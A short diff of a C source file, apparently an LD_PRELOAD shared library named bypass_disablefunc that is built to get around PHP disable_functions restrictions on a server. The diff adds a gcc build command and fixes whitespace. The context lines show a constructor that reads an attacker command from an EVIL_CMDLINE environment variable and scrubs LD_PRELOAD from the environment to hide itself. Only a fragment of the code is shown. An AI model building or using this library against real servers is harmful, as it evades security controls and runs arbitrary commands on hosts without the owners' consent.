@@ -1,3 +1,5 @@
+// gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so
+
 #define _GNU_SOURCE
 
 #include <stdlib.h>
@@ -13,7 +15,7 @@ __attribute__ ((__constructor__)) void preload (void)
     const char* cmdline = getenv("EVIL_CMDLINE");
 
     // unset environment variable LD_PRELOAD.
-    // unsetenv("LD_PRELOAD") no effect on some 
+    // unsetenv("LD_PRELOAD") no effect on some
     // distribution (e.g., centos), I need crafty trick.
     int i;
     for (i = 0; environ[i]; ++i) {
